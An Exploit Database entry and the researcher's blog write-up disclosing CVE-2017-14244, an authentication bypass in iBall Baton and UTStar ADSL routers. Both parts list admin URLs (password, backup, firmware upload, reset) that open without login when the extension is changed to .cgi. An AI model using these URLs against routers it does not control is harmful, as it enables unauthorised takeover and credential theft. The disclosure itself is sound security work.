# Exploit Title: iBall ADSL2+ Home Router Authentication Bypass Vulnerability
# CVE: CVE-2017-14244
# Date: 15-09-2017
# Exploit Author: Gem George
# Author Contact: https://www.linkedin.com/in/gemgrge
# Vulnerable Product: iBall ADSL2+ Home Router WRA150N https://www.iball.co.in/Product/ADSL2--Home-Router/746
# Firmware version: FW_iB-LR7011A_1.0.2
# Vendor Homepage: https://www.iball.co.in
# Reference: https://www.techipick.com/iball-baton-adsl2-home-router-utstar-wa3002g4-adsl-broadband-modem-authentication-bypass

Vulnerability Details
======================
iBall ADSL2+ Home Router does not properly authenticate when pages are accessed through cgi version. This could potentially allow a remote attacker access sensitive information and perform actions such as reset router, downloading backup configuration, upload backup etc.

How to reproduce
===================
Suppose 192.168.1.1 is the router IP and one of the valid page in router is is  http://192.168.1.1/abcd.html, then the page can be directly accessed as as http://192.168.1.1/abcd.cgi

Example URLs:
* http://192.168.1.1/info.cgi – Status and details
* http://192.168.1.1/upload.cgi – Firmware Upgrade
* http://192.168.1.1/backupsettings.cgi – perform backup settings to PC
* http://192.168.1.1/pppoe.cgi – PPPoE settings
* http://192.168.1.1/resetrouter.cgi – Router reset
* http://192.168.1.1/password.cgi – password settings

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

## iBall Baton ADSL2+ Home Router, UTStar WA3002G4 ADSL Broadband Modem Authentication Bypass

Tags : [authentication bypass](https://techipick.com/tag/authentication-bypass/)[iball](https://techipick.com/tag/iball/)[UTStar](https://techipick.com/tag/utstar/)

Category : [Linux](https://techipick.com/category/linux/) [Windows](https://techipick.com/category/windows/)

Hi, I hope you have already gone through my first router exploitation writing [Exploiting Router Authentication through Web Interface (CVE-2017-6558)](https://techipick.com/exploiting-router-authentication-through-web-interface). Once again researching in router exploitation, I found similar bug in two other products iBall Baton ADSL2+ Home Router & UTStar WA3002G4 ADSL Broadband Modem that allowed me to bypass admin panel authentication. Both of these products are from two different vendors, but the vulnerability is same.

I was looking to find some methods to bypass authentication of commonly using routers in my country. First I came to open iBall Baton ADSL2+ Home Router admin page. The admin panel is protected by password authentication. I know some routers use CGI scripts like PayPal use in their websites. I tried to access common pages in the router by appending .cgi at the end of URL. Luckily I got the page info.cgi opened without asking authentication. I got few other pages also which can be accessed in the same way.

**Steps**

1. Suppose 192.168.1.1 is the router IP, then the password reset page is http://192.168.1.1/password.html by default
2. This page is a protected page which can be bypassed by changing URL extension as http://192.168.1.1/password.cgi

In the case of UTStar, the source code of password.cgi page contains the usernames and corresponding passwords in plain text. We can use this password to login admin panel!

Some pages we can directly access:

* http://192.168.1.1/info.cgi – Status and details
* http://192.168.1.1/upload.cgi – Firmware Upgrade
* http://192.168.1.1/backupsettings.cgi – perform backup settings to PC
* http://192.168.1.1/pppoe.cgi – PPPoE settings
* http://192.168.1.1/resetrouter.cgi – Router reset
* http://192.168.1.1/password.cgi – password settings

**Products Affected**

* UTStar WA3002G4 ADSL Broadband Modem – Firmware Version: WA3002G4-0021.01
* iBall Baton ADSL2+ Home Router – Firmware version: FW\_iB-LR7011A\_1.0.2
